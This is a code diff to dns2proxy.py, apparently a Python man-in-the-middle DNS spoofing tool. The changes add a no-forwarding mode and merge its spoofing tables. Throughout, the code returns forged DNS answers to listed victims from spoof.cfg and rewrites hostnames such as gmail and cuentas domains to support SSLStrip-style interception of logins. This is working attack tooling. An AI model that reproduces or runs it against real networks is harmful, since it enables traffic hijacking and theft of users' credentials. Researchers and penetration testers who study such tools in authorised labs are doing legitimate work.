@@ -5,7 +5,9 @@
 #
 # Usage: python2.6 dns2proxy.py <interface> <IPdnsserver> <routingIP> 
 #
-# Example: python2.6 dns2proxy.py eth0 192.168.1.101 192.168.1.200 
+# Example: python2.6 dns2proxy.py eth0 192.168.1.101 192.168.1.200
+# Example for no forwarding (only configured domain based queries and spoofed hosts):
+#   python2.6 dns2proxy.py eth0 -noforward
 #
 # Author: Leonardo Nve ( leonardo.nve@gmail.com)
 #
@@ -38,7 +40,7 @@ spoof = {}
 dominios = {}
 
 nospoof = []
-specificspoof = {}
+
 nospoofto = []
 victims = []
 
@@ -52,6 +54,8 @@ nospoof_file   = "nospoof.cfg"
 nospoofto_file = "nospoofto.cfg"
 specific_file  = "spoof.cfg"
 dominios_file  = "domains.cfg"
+
+Forward = not '-noforward' in sys.argv
 
 if len(sys.argv) >2:
     ip = sys.argv[2]
@@ -84,7 +88,7 @@ def SIGUSR1_handle(signalnum,frame):
 
 def process_files():
 	global nospoof
-	global specificspoof
+	global spoof
 	global nospoof_file
 	global specific_file
 	global dominios_file
@@ -101,7 +105,7 @@ def process_files():
 		victims.remove(i)
 
 	dominios.clear()
-	specificspoof.clear()
+	spoof.clear()
 
 	nsfile = open(nospoof_file,'r')
 	for line in nsfile:
@@ -144,7 +148,7 @@ def process_files():
 		h = line.split()
 		if len(h)>1:
 			print 'Specific host spoofing '+h[0]+' with '+h[1]
-			specificspoof[h[0]] = h[1]
+			spoof[h[0]] = h[1]
 
 	nsfile.close()
 	nsfile = open(dominios_file,'r')
@@ -462,46 +466,43 @@ def std_A_qry(msg,prov_ip):
             return resp, dosleep
 
 
-        if spoof.has_key(qname):
-            return std_ASPOOF_qry(msg), dosleep
-
         ips = respuestas(qname.lower(), 'A')
-        if isinstance(ips,numbers.Integral) and not specificspoof.has_key(qname.lower()):
-            host2=''
-            if host[:5]=='wwww.' or host[:7]=='social.':
-            	host2='www%s'%(dominio)
-            elif host[:3]=='web':
-            	host2 = host[3:]
-            elif host[:7]=='cuentas':
-            	host2 = 'accounts%s'%(dominio)
-            elif host[:5]=='gmail':
-            	host2 = 'mail%s'%(dominio)
-            elif host=='chatenabled.gmail.google.com':   # Yes, It is ugly....
-            	host2 ='chatenabled.mail.google.com'
-            if host2!='':
-            	print 'SSLStrip transforming host: %s => %s ...'%(host,host2)
-            	ips = respuestas(host2,'A')
+        if not spoof.has_key(qname.lower()):
+            if isinstance(ips,numbers.Integral):
+                host2=''
+                if host[:5]=='wwww.' or host[:7]=='social.':
+                    host2='www%s'%(dominio)
+                elif host[:3]=='web':
+                    host2 = host[3:]
+                elif host[:7]=='cuentas':
+                    host2 = 'accounts%s'%(dominio)
+                elif host[:5]=='gmail':
+                    host2 = 'mail%s'%(dominio)
+                elif host=='chatenabled.gmail.google.com':   # Yes, It is ugly....
+                    host2 ='chatenabled.mail.google.com'
+                if host2!='':
+                    print 'SSLStrip transforming host: %s => %s ...'%(host,host2)
+                    ips = respuestas(host2,'A')
 
-        #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
-        prov_resp = ips[0]
-        consultas[prov_ip] = prov_resp
+            #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
 
-        if isinstance(ips, numbers.Integral):
-            print 'No host....'
-            resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
-            return resp, dosleep
+            if isinstance(ips, numbers.Integral):
+                print 'No host....'
+                resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
+                return resp, dosleep
 
+            prov_resp = ips[0]
+            consultas[prov_ip] = prov_resp
 
         ttl = 1
         if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims)==0 or prov_ip in victims):
-                if specificspoof.has_key(host):
+                if spoof.has_key(host):
                     save_req(LOGREQFILE,'!!! Specific host ('+host+') asked....\n')
-                    print 'Adding fake IP = '+ specificspoof[host]
-                    rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, specificspoof[host])
+                    print 'Adding fake IP = '+ spoof[host]
+                    rrset = dns.rrset.from_text(q.name, 1000 ,dns.rdataclass.IN, dns.rdatatype.A, spoof[host])
                     resp.answer.append(rrset)
-                    if isinstance(ips,numbers.Integral):
-                        return resp, dosleep
-                else:
+                    return resp, dosleep
+                elif Forward:
                     consultas[prov_ip]=prov_resp
                     #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                     if len(sys.argv) > 2:
@@ -510,10 +511,15 @@ def std_A_qry(msg,prov_ip):
                         resp.answer.append(rrset)
                     if len(sys.argv) > 3:
     	                #Sleep only when using global resquest matrix
-	                dosleep = True
+    	                dosleep = True
                         rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[3])
                         print 'Adding fake IP = ' + sys.argv[3]
                         resp.answer.append(rrset)
+
+        if not Forward:
+            print 'No forwarding....'
+            resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
+            return resp, dosleep
 
         for ip in ips:
             print 'Adding real IP  = ' + ip.to_text()
@@ -534,6 +540,7 @@ def std_A_qry(msg,prov_ip):
 # 	return resp
 
 def std_ASPOOF_qry(msg):
+    global spoof
     qs = msg.question
     print str(len(qs)) + ' questions.'
     iparpa = qs[0].to_text().split(' ', 1)[0]
@@ -542,7 +549,7 @@ def std_ASPOOF_qry(msg):
 
     for q in qs:
         qname = q.name.to_text()[:-1]
-        print 'q name = ' + qname
+        print 'q name = ' + qname + ' to resolve ' + spoof[qname]
         # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
         # 		resp.answer.append(rrset)
         # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
@@ -551,7 +558,7 @@ def std_ASPOOF_qry(msg):
         # 		resp.answer.append(rrset)
         # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.twitter.com.')
         # 		resp.answer.append(rrset)
-        rrset = dns.rrset.from_text(qname, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof[qname])
+        rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof[qname])
         resp.answer.append(rrset)
         return resp
 
@@ -580,11 +587,16 @@ signal.signal(signal.SIGUSR1,SIGUSR1_handle)
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('', 53))
+if Forward:
+    print 'DNS Forwarding activado....'
+else:
+    print 'DNS Forwarding desactivado....'
+
 print 'binded to UDP port 53.'
 serving_ids = []
 noserv = 1
 
-if len(sys.argv) >2:
+if len(sys.argv) >2 and Forward:
 	sniff = ThreadSniffer()
 	sniff.start()
 
